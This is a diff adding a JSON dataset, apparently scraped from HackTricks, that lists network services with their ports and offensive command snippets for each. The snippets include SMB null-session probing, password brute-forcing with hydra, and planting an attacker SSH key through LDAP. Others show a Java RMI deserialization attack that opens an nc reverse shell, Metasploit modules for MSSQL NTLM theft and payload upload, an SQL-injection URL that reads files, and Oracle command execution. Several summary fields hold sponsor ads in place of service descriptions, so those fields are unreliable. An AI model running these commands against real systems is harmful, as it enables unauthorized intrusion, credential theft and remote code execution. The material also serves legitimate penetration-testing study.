+      "#/bin/bash\nip='<TARGET-IP-HERE>'\nshares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')\nfor share in ${shares[*]}; do\n    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '')\n    if [[ -z $output ]]; then\n        echo \"[+] creating a null session is possible for $share\" # no output if command goes through, thus assuming that a session was created\n    else\n        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\n    fi\ndone",
+      "smbclient -U '%' -N \\\\\\\\192.168.0.24\\\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-imap",
+   "name": "IMAP",
+   "ports": [
+    143,
+    993
+   ],
+   "summary": "As its name implies, IMAP allows you to access your email messages wherever you are; much of the time, it is accessed via the Internet. Basically, email messages are stored on servers. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP, you aren't actually downloading or storing it on your computer; inst",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html",
+   "sections": [
+    {
+     "heading": "Internet Message Access Protocol",
+     "commands": [
+      "PORT    STATE SERVICE REASON\n143/tcp open  imap    syn-ack"
+     ]
+    },
+    {
+     "heading": "Banner grabbing",
+     "commands": [
+      "nc -nv <IP> 143\nopenssl s_client -connect <IP>:993 -quiet"
+     ]
+    },
+    {
+     "heading": "NTLM Auth - Information disclosure",
+     "commands": [
+      "root@kali: telnet example.com 143\n* OK The Microsoft Exchange IMAP4 service is ready.\n>> a1 AUTHENTICATE NTLM\n+\n>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=\n+ TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA"
+     ]
+    },
+    {
+     "heading": "Syntax",
+     "commands": [
+      "Login\n    A1 LOGIN username password\nValues can be quoted to enclose spaces and special characters. A \" must then be escape with a \\\n    A1 LOGIN \"username\" \"password\"\nList Folders/Mailboxes\n    A1 LIST \"\" *\n    A1 LIST INBOX *\n    A1 LIST \"Archive\" *\nCreate new Folder/Mailbox\n    A1 CREATE INBOX.Archive.2012\n    A1 CREATE \"To Read\"\nDelete Folder/Mailbox\n    A1 DELETE INBOX.Archive.2012\n    A1 DELETE \"To Read\"\nRename Folder/Mailbox\n    A1 RENAME \"INBOX.One\" \"INBOX.Two\"\nList Subscribed Mailboxes\n    A1 LSUB \"\" *\nStatus of Mailbox (There are more flags than the ones listed)\n    A1 STATUS INBOX (MESSAGES UNSEEN RECENT)\nSelect a mailbox\n    A1 SELECT INBOX\nList messages\n    A1 FETCH 1:* (FLAGS)\n    A1 UID FETCH 1:* (FLAGS)\nRetrieve Message Content\n    A1 FETCH 2 body[text]\n    A1 FETCH 2 all\n    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])\nClose Mailbox\n    A1 CLOSE\nLogout\n    A1 LOGOUT"
+     ]
+    },
+    {
+     "heading": "Evolution",
+     "commands": [
+      "apt install evolution"
+     ]
+    },
+    {
+     "heading": "CURL",
+     "commands": [
+      "$ curl -k 'imaps://1.2.3.4/' --user user:pass",
+      "$ curl -k 'imaps://1.2.3.4/INBOX?ALL' --user user:pass",
+      "$ curl -k 'imaps://1.2.3.4/Drafts?TEXT password' --user user:pass",
+      "$ curl -k 'imaps://1.2.3.4/Drafts;MAILINDEX=1' --user user:pass",
+      "$ curl -k 'imaps://1.2.3.4/INBOX' -X 'UID SEARCH ALL' --user user:pass\n$ curl -k 'imaps://1.2.3.4/INBOX;UID=1' --user user:pass",
+      "$ curl -k 'imaps://1.2.3.4/INBOX' -X 'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]' --user user:pass -v 2>&1 | grep '^<'",
+      "for m in {1..5}; do\n  echo $m\n  curl \"imap://1.2.3.4/INBOX;MAILINDEX=$m;SECTION=HEADER.FIELDS%20(SUBJECT%20FROM)\" --user user:pass\ndone"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: IMAP    #Protocol Abbreviation if there is one.\nPort_Number:  143,993     #Comma separated if there is more than one.\nProtocol_Description: Internet Message Access Protocol         #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Notes\n  Description: Notes for WHOIS\n  Note: |\n    As its name implies, IMAP allows you to access your email messages wherever you are; much of the time, it is accessed via the Internet. Basically, email messages are stored on servers. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP, you aren't actually downloading or storing it on your computer; instead, you are reading it off of the server. As a result, it's possible to check your email from several different devices without missing a thing.\n    https://book.hacktricks.xyz/pentesting/pentesting-imap\nEntry_2:\n  Name: Banner Grab\n  Description: Banner Grab 143\n  Command: nc -nv {IP} 143\nEntry_3:\n  Name: Secure Banner Grab\n  Description: Banner Grab 993\n  Command: openssl s_client -connect {IP}:993 -quiet\nEntry_4:\n  Name: consolesless mfs enumeration\n  Description: IMAP enumeration without the need to run msfconsole\n  Note: sourced from https://github.com/carlospolop/legion\n  Command: msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS {IP}; set RPORT 143; run; exit'"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-irc",
+   "name": "IRC",
+   "ports": [
+    194,
+    6667,
+    6660
+   ],
+   "summary": "IRC was originally a plain text protocol (although later extended), which on request was assigned port 194/TCP by IANA. However, the de facto standard has always been to run IRC on 6667/TCP and nearby port numbers (for example TCP ports 6660–6669, 7000) to avoid having to run the IRCd software with root privileges.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-irc.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE\n6667/tcp open  irc"
+     ]
+    },
+    {
+     "heading": "Banner",
+     "commands": [
+      "nc -vn <IP> <PORT>\nopenssl s_client -connect <IP>:<PORT> -quiet"
+     ]
+    },
+    {
+     "heading": "Manual",
+     "commands": [
+      "#Connection with random nickname\nUSER ran213eqdw123 0 * ran213eqdw123\nNICK ran213eqdw123\n#If a PING :<random> is responded you need to send\n#PONG :<received random>\nVERSION\nHELP\nINFO\nLINKS\nHELPOP USERCMDS\nHELPOP OPERCMDS\nOPERATOR CAPA\nADMIN      #Admin info\nUSERS      #Current number of users\nTIME       #Server's time\nSTATS a    #Only operators should be able to run this\nNAMES      #List channel names and usernames inside of each channel -> Nombre del canal y nombre de las personas que estan dentro\nLIST       #List channel names along with channel banner\nWHOIS <USERNAME>      #WHOIS a username\nUSERHOST <USERNAME>   #If available, get hostname of a user\nUSERIP <USERNAME>     #If available, get ip of a user\nJOIN <CHANNEL_NAME>   #Connect to a channel\n#Operator creds Brute-Force\nOPER <USERNAME> <PASSWORD>",
+      "PASS wealllikedebian\nNICK patrick\nUSER test1 test2 <IP> :test3"
+     ]
+    },
+    {
+     "heading": "Find and scan IRC services",
+     "commands": [
+      "nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 <ip>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-ldap",
+   "name": "LDAP",
+   "ports": [
+    389,
+    636,
+    3268,
+    3269
+   ],
+   "summary": "Extracted from: https://searchmobilecomputing.techtarget.com/definition/LDAP",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE REASON\n389/tcp open  ldap    syn-ack\n636/tcp open  tcpwrapped"
+     ]
+    },
+    {
+     "heading": "LDAP Data Interchange Format",
+     "commands": [
+      "dn: dc=local\ndc: local\nobjectClass: dcObject\ndn: dc=moneycorp,dc=local\ndc: moneycorp\nobjectClass: dcObject\nobjectClass: organization\ndn ou=it,dc=moneycorp,dc=local\nobjectClass: organizationalUnit\nou: dev\ndn: ou=marketing,dc=moneycorp,dc=local\nobjectClass: organizationalUnit\nOu: sales\ndn: cn= ,ou= ,dc=moneycorp,dc=local\nobjectClass: personalData\ncn:\nsn:\ngn:\nuid:\nou:\nmail: pepe@hacktricks.xyz\nphone: 23627387495"
+     ]
+    },
+    {
+     "heading": "Write data",
+     "commands": [
+      ">>> import ldap3\n>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)\n>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)\n>>> connection.bind()\nTrue\n>>> connection.extend.standard.who_am_i()\nu'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'\n>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})"
+     ]
+    },
+    {
+     "heading": "Bypass TLS SNI check",
+     "commands": [
+      "ldapsearch -H ldaps://company.com:636/ -x -s base -b '' \"(objectClass=*)\" \"*\" +"
+     ]
+    },
+    {
+     "heading": "Valid Credentials",
+     "commands": [
+      "pip3 install ldapdomaindump\nldapdomaindump <IP> [-r <IP>] -u '<domain>\\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]"
+     ]
+    },
+    {
+     "heading": "Automated",
+     "commands": [
+      "nmap -n -sV --script \"ldap* and not brute\" <IP> #Using anonymous credentials"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rexec",
+   "name": "Rexec",
+   "ports": [
+    512
+   ],
+   "summary": "It is a service that allows you to execute a command inside a host if you know valid credentials (username and password).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/512-pentesting-rexec.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n512/tcp open  exec"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rlogin",
+   "name": "Rlogin",
+   "ports": [
+    513
+   ],
+   "summary": "This service was mostly used in the old days for remote administration but now because of security issues this service has been replaced by the slogin and the ssh.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rlogin.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n513/tcp open  login"
+     ]
+    },
+    {
+     "heading": "Login",
+     "commands": [
+      "apt-get install rsh-client",
+      "rlogin <IP> -l <username>"
+     ]
+    },
+    {
+     "heading": "Find files",
+     "commands": [
+      "find / -name .rhosts"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rsh",
+   "name": "Rsh",
+   "ports": [
+    514
+   ],
+   "summary": "Rsh use .rhosts files and /etc/hosts.equiv for authentication. These methods relied on IP addresses and DNS (Domain Name System) for authentication. However, spoofing IP addresses is fairly easy, especially if the attacker is on the local network.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rsh.html",
+   "sections": [
+    {
+     "heading": "Login",
+     "commands": [
+      "rsh <IP> <Command>\nrsh <IP> -l domain\\user <Command>\nrsh domain/user@<IP> <Command>\nrsh domain\\\\user@<IP> <Command>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-apple-filing-protocol-afp",
+   "name": "Apple Filing Protocol (AFP)",
+   "ports": [
+    548
+   ],
+   "summary": "The Apple Filing Protocol (AFP), formerly AppleTalk Filing Protocol, is a proprietary network protocol, and part of the Apple File Service (AFS), that offers file services for macOS and the classic Mac OS. In macOS, AFP is one of several file services supported\\\\.\\\\ AFP currently supports Unicode file names, POSIX and access control list permissions, resource forks, named extended attributes, and ",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/584-pentesting-afp.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n548/tcp open  afp"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "msf> use auxiliary/scanner/afp/afp_server_info\nnmap -sV --script \"afp-* and not dos and not brute\" -p <PORT> <IP>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rtsp",
+   "name": "RTSP",
+   "ports": [
+    554,
+    8554
+   ],
+   "summary": "> The Real Time Streaming Protocol (RTSP) is a network control protocol designed for use in entertainment and communications systems to control streaming media servers. The protocol is used for establishing and controlling media sessions between end points. Clients of media servers issue VHS-style commands, such as play, record and pause, to facilitate real-time control of the media streaming from",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n554/tcp open  rtsp"
+     ]
+    },
+    {
+     "heading": "Detailed Information",
+     "commands": [
+      "import socket\nreq = \"DESCRIBE rtsp://<ip>:<port> RTSP/1.0\\r\\nCSeq: 2\\r\\nAuthorization: Basic YWRtaW46MTIzNA==\\r\\n\\r\\n\"\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"192.168.1.1\", 554))\ns.sendall(req)\ndata = s.recv(1024)\nprint(data)"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "nmap -sV --script \"rtsp-*\" -p <PORT> <IP>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rsync",
+   "name": "Rsync",
+   "ports": [
+    873
+   ],
+   "summary": "> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times)and sizes of files.[\\[3\\]](https://en.wikipedia.org/wiki/Rsync#cite\\note-man\\page-3) It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE REASON\n873/tcp open  rsync   syn-ack"
+     ]
+    },
+    {
+     "heading": "Banner & Manual communication",
+     "commands": [
+      "nc -vn 127.0.0.1 873\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0        <--- You receive this banner with the version from the server\n@RSYNCD: 31.0        <--- Then you send the same info\n#list                <--- Then you ask the sever to list\nraidroot             <--- The server starts enumerating\nUSBCopy\nNAS_Public\n_NAS_Recycle_TOSRAID\t<--- Enumeration finished\n@RSYNCD: EXIT         <--- Sever closes the connection\n#Now lets try to enumerate \"raidroot\"\nnc -vn 127.0.0.1 873\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0\n@RSYNCD: 31.0\nraidroot\n@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password"
+     ]
+    },
+    {
+     "heading": "Enumerate shared folders",
+     "commands": [
+      "nmap -sV --script \"rsync-list-modules\" -p <PORT> <IP>\nmsf> use auxiliary/scanner/rsync/modules_list\n#Example using IPv6 and a different port\nrsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730"
+     ]
+    },
+    {
+     "heading": "Manual Rsync",
+     "commands": [
+      "rsync -av --list-only rsync://192.168.0.123/shared_name",
+      "rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared",
+      "rsync -av --list-only rsync://username@192.168.0.123/shared_name\nrsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared",
+      "rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh"
+     ]
+    },
+    {
+     "heading": "POST",
+     "commands": [
+      "find /etc \\( -name rsyncd.conf -o -name rsyncd.secrets \\)"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-socks",
+   "name": "Socks",
+   "ports": [
+    1080
+   ],
+   "summary": "SOCKS is an Internet protocol that exchanges network packets between a client and server through a proxy server. SOCKS5 optionally provides authentication,\\ so only authorized users may access a server.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/1080-pentesting-socks.html",
+   "sections": [
+    {
+     "heading": "Authentication Check",
+     "commands": [
+      "nmap -p 1080 <ip> --script socks-auth-info"
+     ]
+    },
+    {
+     "heading": "Basic usage",
+     "commands": [
+      "nmap --script socks-brute -p 1080 <ip>"
+     ]
+    },
+    {
+     "heading": "Advanced usage",
+     "commands": [
+      "nmap  --script socks-brute --script-args userdb=users.txt,passdb=rockyou.txt,unpwdb.timelimit=30m -p 1080 <ip>"
+     ]
+    },
+    {
+     "heading": "Output",
+     "commands": [
+      "PORT     STATE SERVICE\n1080/tcp open  socks\n| socks-brute:\n|   Accounts\n|     patrik:12345 - Valid credentials\n|   Statistics\n|_    Performed 1921 guesses in 6 seconds, average tps: 320"
+     ]
+    },
+    {
+     "heading": "Basic proxychains usage",
+     "commands": [
+      "nano /etc/proxychains4.conf",
+      "socks5 10.10.10.10 1080",
+      "socks5 10.10.10.10 1080 username password"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-java-rmi-rmi-iiop",
+   "name": "Java RMI - RMI-IIOP",
+   "ports": [
+    1098,
+    1099,
+    1050
+   ],
+   "summary": "\\ Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.\\ Get Access Today:",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/1099-pentesting-java-rmi.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT      STATE SERVICE      VERSION\n1090/tcp  open  ssl/java-rmi Java RMI\n9010/tcp  open  java-rmi     Java RMI\n37471/tcp open  java-rmi     Java RMI\n40259/tcp open  ssl/java-rmi Java RMI"
+     ]
+    },
+    {
+     "heading": "RMI Components",
+     "commands": [
+      "import java.rmi.registry.Registry;\nimport java.rmi.registry.LocateRegistry;\nimport lab.example.rmi.interfaces.RemoteService;\npublic class ExampleClient {\n  private static final String remoteHost = \"172.17.0.2\";\n  private static final String boundName = \"remote-service\";\n  public static void main(String[] args)\n  {\n    try {\n      Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry\n      RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name\n      String response = ref.remoteMethod();                           // Call a remote method\n    } catch( Exception e) {\n      e.printStackTrace();\n    }\n  }\n}"
+     ]
+    },
+    {
+     "heading": "RMI Enumeration",
+     "commands": [
+      "$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'\n[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]\n[+]\n[+] ObjNum: \t\t-4004948013687638236\n[+] UID:\n[+] \tUnique: \t1442798173\n[+] \tTime: \t\t1640761503828 (Dec 29,2021 08:05)\n[+] \tCount: \t\t-32760"
+     ]
+    },
+    {
+     "heading": "Bruteforcing Remote Methods",
+     "commands": [
+      "$ rmg guess 172.17.0.2 9010\n[+] Reading method candidates from internal wordlist rmg.txt\n[+] \t752 methods were successfully parsed.\n[+] Reading method candidates from internal wordlist rmiscout.txt\n[+] \t2550 methods were successfully parsed.\n[+]\n[+] Starting Method Guessing on 3281 method signature(s).\n[+]\n[+] \tMethodGuesser is running:\n[+] \t\t--------------------------------\n[+] \t\t[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!\n[+] \t\t[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!\n[+] \t\t[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!\n[+] \t\t[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!\n[+] \t\t[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!\n[+] \t\t[6562 / 6562] [#####################################] 100%\n[+] \tdone.\n[+]\n[+] Listing successfully guessed methods:\n[+]\n[+] \t- plain-server2 == plain-server\n[+] \t\t--> String execute(String dummy)\n[+] \t\t--> String system(String dummy, String[] dummy2)\n[+] \t- legacy-service\n[+] \t\t--> void logMessage(int dummy1, String dummy2)\n[+] \t\t--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)\n[+] \t\t--> String login(java.util.HashMap dummy1)",
+      "$ rmg call 172.17.0.2 9010 '\"id\"' --bound-name plain-server --signature \"String execute(String dummy)\" --plugin GenericPrint.jar\n[+] uid=0(root) gid=0(root) groups=0(root)",
+      "$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature \"String execute(String dummy)\"\n[+] Creating ysoserial payload... done.\n[+]\n[+] Attempting deserialization attack on RMI endpoint...\n[+]\n[+] \tUsing non primitive argument type java.lang.String on position 0\n[+] \tSpecified method signature is String execute(String dummy)\n[+]\n[+] \tCaught ClassNotFoundException during deserialization attack.\n[+] \tServer attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.\n[+] \tDeserialization attack probably worked :)\n$ nc -vlp 4444\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 172.17.0.2.\nNcat: Connection from 172.17.0.2:45479.\nid\nuid=0(root) gid=0(root) groups=0(root)"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.\nPort_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.\nProtocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Enumeration\n  Description: Perform basic enumeration of an RMI service\n  Command: rmg enum {IP} {PORT}"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-mssql-microsoft-sql-server",
+   "name": "MSSQL - Microsoft SQL Server",
+   "ports": [
+    1433
+   ],
+   "summary": "Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\\ This crypto bounty alone is worth $1.000.000!\\ Check out the top-paying bounties among crypto projects.\\ Sign up on HackenProof to get rewarded without delays and become the web3 hacker legend.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM"
+     ]
+    },
+    {
+     "heading": "Automatic Enumeration",
+     "commands": [
+      "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>\nmsf> use auxiliary/scanner/mssql/mssql_ping"
+     ]
+    },
+    {
+     "heading": "Metasploit (need creds)",
+     "commands": [
+      "#Set USERNAME, RHOSTS and PASSWORD\n#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used\n#Steal NTLM\nmsf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder\n#Info gathering\nmsf> use admin/mssql/mssql_enum #Security checks\nmsf> use admin/mssql/mssql_enum_domain_accounts\nmsf> use admin/mssql/mssql_enum_sql_logins\nmsf> use auxiliary/admin/mssql/mssql_findandsampledata\nmsf> use auxiliary/scanner/mssql/mssql_hashdump\nmsf> use auxiliary/scanner/mssql/mssql_schemadump\n#Search for insteresting data\nmsf> use auxiliary/admin/mssql/mssql_findandsampledata\nmsf> use auxiliary/admin/mssql/mssql_idf\n#Privesc\nmsf> use exploit/windows/mssql/mssql_linkcrawler\nmsf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate\nmsf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin\n#Code execution\nmsf> use admin/mssql/mssql_exec #Execute commands\nmsf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload\n#Add new admin user from meterpreter session\nmsf> use windows/manage/mssql_local_auth_bypass"
+     ]
+    },
+    {
+     "heading": "Execute OS Commands",
+     "commands": [
+      "Use master\nEXEC sp_helprotect 'xp_cmdshell'"
+     ]
+    },
+    {
+     "heading": "Capture hash",
+     "commands": [
+      "{% hint style=\"warning\" %}\nYou can check if who (apart sysadmins) has permissions to run those MSSQL functions with:"
+     ]
+    },
+    {
+     "heading": "Read file with OPENROWSET",
+     "commands": [
+      "SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents"
+     ]
+    },
+    {
+     "heading": "Error-based vector for SQLi:",
+     "commands": [
+      "https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\\Windows\\win.ini',SINGLE_CLOB)+R(x))--"
+     ]
+    },
+    {
+     "heading": "If you found you are dbowner of a trustworthy database, you can privesc:",
+     "commands": [
+      "You can use a **metasploit** module:",
+      "Or a **PS** script:"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-oracle-tns-listener",
+   "name": "Oracle TNS Listener",
+   "ports": [
+    1521,
+    1522,
+    1523,
+    1524,
+    1525,
+    1526,
+    1527,
+    1528,
+    1529
+   ],
+   "summary": "Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from here).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)\n1748/tcp open  oracle-tns    Oracle TNS Listener"
+     ]
+    },
+    {
+     "heading": "TNS listener version",
+     "commands": [
+      "nmap --script \"oracle-tns-version\" -p 1521 -T4 -sV <IP>\nmsf> use auxiliary/scanner/oracle/tnslsnr_version\n#apt install tnscmd10g\ntnscmd10g version -p 1521 -h <IP>",
+      "hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener"
+     ]
+    },
+    {
+     "heading": "What is a SID",
+     "commands": [
+      "tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)\n#msf1\nmsf> use auxiliary/scanner/oracle/sid_enum\nmsf> set rhost <IP>\nmsf> run\n#msf2\nmsf> use auxiliary/admin/oracle/tnscmd\nmsf> set CMD (CONNECT_DATA=(COMMAND=STATUS))\nmsf> set rhost <IP>\nmsf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)",
+      "hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid\npatator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505\n./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt\nmsf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt\nnmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids",
+      "pip3 install cx_Oracle --upgrade"
+     ]
+    },
+    {
+     "heading": "Brute Force",
+     "commands": [
+      "sqlplus <username>/<password>@<ip_address>/<SID>;",
+      "sqlplus <username>/<password>@<ip_address>:<port>/<SID>;",
+      "sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';\n#Example:\nsqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'"
+     ]
+    },
+    {
+     "heading": "All in One",
+     "commands": [
+      "#apt install oscanner\noscanner -s <IP> -P <PORT>",
+      "git clone https://github.com/quentinhardy/odat.git\ncd odat\n./odat.py --help #It shouldn't be problems in Kali\n./odat.py all -s <IP> -p <PORT>\n./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID"
+     ]
+    },
+    {
+     "heading": "Install ODAT",
+     "commands": [
+      "git clone https://github.com/quentinhardy/odat.git\ncd odat\n./odat.py #It shouldn't be problems in Kali"
+     ]
+    },
+    {
+     "heading": "Execute Code via Java Stored Procedure",
+     "commands": [
+      "./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND"
+     ]
+    },
+    {
+     "heading": "Execute code via Scheduler",
+     "commands": [
+      "./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec \"C:\\windows\\system32\\cmd.exe /c echo 123&gt;&gt;C:\\hacK\""
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-pptp",
+   "name": "PPTP",
+   "ports": [
+    1723
+   ],
